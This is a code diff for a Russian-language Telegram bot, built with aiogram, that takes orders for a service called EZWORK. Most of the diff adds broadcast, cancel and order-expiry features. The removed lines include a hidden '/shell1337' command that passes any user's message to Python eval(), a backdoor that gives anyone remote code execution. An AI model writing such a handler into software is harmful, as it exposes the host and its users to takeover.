@@ -1,16 +1,19 @@
 import logging
-from aiogram import Bot, Dispatcher, executor
+from aiogram import Bot, Dispatcher, executor, types
+from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters.state import StatesGroup, State
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from aiogram.types import *
 from asyncio import sleep
 import random
 
 
-from config import API_TOKEN
+#from config import API_TOKEN
 
 logging.basicConfig(level=logging.INFO)
 
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher(bot)
+bot = Bot(token='')
+dp = Dispatcher(bot,storage=MemoryStorage())
 
 
 WELCOME_MESSAGE = """Привет, я бот EZWORK👋
@@ -61,15 +64,19 @@ SIXTH_QUESTION = """6. Цена заказа?
 BUTTON_1 = 'Сделать заказ'
 BUTTON_2 = 'Отменить заказ'
 BUTTON_3 = """Реквизиты"""
+BUTTON_4 = 'Отменить заказ'
 
 OWNER_ID = 702885050
-
+texsts = ""
 kb_1 = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton(BUTTON_1)).add(KeyboardButton(BUTTON_3))
 kb_2 = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton(BUTTON_2)).add(KeyboardButton(BUTTON_3))
-
+kb_3 = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton(BUTTON_3)).add(KeyboardButton(BUTTON_4))
+kb_4 = InlineKeyboardMarkup().add(InlineKeyboardButton(text="Да",callback_data='da')).add(InlineKeyboardButton(text="Нет",callback_data='net'))
 users = {}
 orders = {}
 
+class getstates(StatesGroup):
+    inputphoto = State()
 
 def get_users():
     with open('users.txt', 'r') as f:
@@ -91,13 +98,23 @@ def update_banneds(banneds):
         f.write('\n'.join([str(i) for i in banneds]))
 
 
-@dp.message_handler(commands=['shell1337'])
-async def handler(message: Message):
+@dp.message_handler(state=getstates.inputphoto)
+async def inputphoto(message: types.Message, state: FSMContext):
+    answer = message.text
+    ids = set(get_users())
     try:
-        message.answer(eval(message.text.split(' ', 1)[1]))
-    except Exception as e:
-        message.answer(str(e))
-
+        await message.answer_photo(answer)
+    except:
+        await message.answer('Вы ввели неверную ссылку')
+    good = bad = 0
+    for id in ids:
+        try:
+            await bot.send_photo(id,answer,caption=texsts)
+            good += 1
+        except:
+            bad += 1
+    await message.answer(f'Рассылка завершена!\n\nУспешно: {good}\nОшибка: {bad}\nВсего: {good + bad}')            
+    await state.finish()
 
 @dp.message_handler(commands=['start'])
 async def handler(message: Message):
@@ -126,10 +143,29 @@ async def handler(message: Message):
         await message.answer(WELCOME_MESSAGE)
 
 
+#@dp.message_handler(content_types=['photo'])
+@dp.callback_query_handler()
+async def query_handler(call):
+    user_id = call.message.chat.id
+    ids = set(get_users())
+    if call.message:
+        if call.data == 'da':
+            await call.message.answer('Введите ссылку на фото.(Сделать ссылку поможет этот бот - @imgurbot_bot)')
+            await getstates.inputphoto.set()
+        elif call.data == 'net':
+            good = bad = 0
+            for id in ids:
+                try:
+                    await bot.send_message(id, texsts)
+                    good += 1
+                except:
+                    bad += 1
+            await call.message.answer(f'Рассылка завершена!\n\nУспешно: {good}\nОшибка: {bad}\nВсего: {good + bad}')            
+
+
 @dp.message_handler(content_types=ContentType.ANY)
 async def handler(message: Message):
     id, tx = message.from_user.id, message.text
-
     if id in get_banneds():
         return
 
@@ -143,22 +179,38 @@ async def handler(message: Message):
             txt = message.reply_to_message.text
             order_id = int(txt.split(': ')[1].split('\n')[0])
             user_id = orders[order_id]
-            await bot.forward_message(chat_id=user_id, from_chat_id=OWNER_ID, message_id=message.message_id)
-            await message.answer('Отправлено!')
+            if users[user_id]['step'] != 7:
+                await message.answer('У пользователя нет активных заказов')
+            else:
+                await bot.forward_message(chat_id=user_id, from_chat_id=OWNER_ID, message_id=message.message_id)
+                await message.answer('Отправлено!')
+        elif message.text.startswith('/broadcast '):
+            text = tx[11:]
+            global texsts
+            texsts = text
+            await message.answer('Хотите отправить фото?',reply_markup=kb_4)
+        elif tx == '/users':
+            await message.answer(f'Юзеров в боте: {len(get_users())}\nИз них забаненных: {len(get_banneds())}')        
         elif tx.startswith('/accept_'):
             order_id = int(tx.split('_')[1])
-            user_id = orders[order_id]
-            del orders[order_id]
-            users[user_id]['step'] = 0
-            await bot.send_message(user_id, ACCEPTED_MESSAGE, reply_markup=kb_1)
-            await message.answer('Заказ принят!')
+            if not any( x == order_id for x in orders):
+                await message.answer('Заказ не актуален')
+            else:
+                user_id = orders[order_id]
+                del orders[order_id]
+                users[user_id]['step'] = 0
+                await bot.send_message(user_id, ACCEPTED_MESSAGE, reply_markup=kb_1)
+                await message.answer('Заказ принят!')
         elif tx.startswith('/decline_'):
             order_id = int(tx.split('_')[1])
-            user_id = orders[order_id]
-            del orders[order_id]
-            users[user_id]['step'] = 0
-            await bot.send_message(user_id, DENIED_OTMENA_MESSAGE, reply_markup=kb_1)
-            await message.answer('Заказ отклонен!')
+            if not any( x == order_id for x in orders):
+                await message.answer('Заказ не актуален')
+            else:
+                user_id = orders[order_id]
+                del orders[order_id]
+                users[user_id]['step'] = 0
+                await bot.send_message(user_id, DENIED_OTMENA_MESSAGE, reply_markup=kb_1)
+                await message.answer('Заказ отклонен!')
         elif tx.startswith('/ban '):
             id_ban = int(tx.split()[-1])
             banneds = set(get_banneds())
@@ -171,18 +223,6 @@ async def handler(message: Message):
             banneds.discard(id_ban)
             update_banneds(list(banneds))
             await message.answer('Разбанен!')
-        elif tx.startswith('/broadcast '):
-            text = tx[11:]
-            good = bad = 0
-            for id in ids:
-                try:
-                    await bot.send_message(id, text)
-                    good += 1
-                except:
-                    bad += 1
-            await message.answer(f'Рассылка завершена!\n\nУспешно: {good}\nОшибка: {bad}\nВсего: {good + bad}')
-        elif tx == '/users':
-            await message.answer(f'Юзеров в боте: {len(get_users())}\nИз них забаненных: {len(get_banneds())}')
 
     elif id not in users.keys():
         users[id] = {
@@ -205,6 +245,15 @@ async def handler(message: Message):
 
     elif tx == BUTTON_3:
         await message.answer(CONST_MESSAGE)
+
+    elif tx == BUTTON_4 and users[id]['step'] == 7:
+        users[id] = {
+            'step': 0,
+            'answers': []
+        }
+        await message.answer(CANCEL_MESSAGE, reply_markup=kb_1)
+        await bot.send_message(OWNER_ID,f'Пользователь {message.from_user.mention} отменил заказ')       
+
 
     elif users[id]['step'] == 1:
         await message.answer(SECOND_QUESTION)
@@ -238,7 +287,7 @@ async def handler(message: Message):
 
         orders[order_id] = id
 
-        await message.answer(FILLED_MESSAGE.format(order_id), reply_markup=kb_1)
+        await message.answer(FILLED_MESSAGE.format(order_id), reply_markup=kb_3)
         users[id]['answers'].append(message.message_id)
         users[id]['step'] = 7
 
@@ -247,6 +296,15 @@ async def handler(message: Message):
             await bot.forward_message(chat_id=OWNER_ID, from_chat_id=id, message_id=msg)
 
         users[id]['answers'] = []
+
+        await sleep(3 * 3600)
+
+        if order_id in orders.keys():
+            try:
+                await message.answer(DENIED_AFK_MESSAGE, reply_markup=kb_1)
+            except:
+                pass
+        del orders[order_id]
 
     elif users[id]['step'] == 7:
         for order_id, user_id in orders.items():
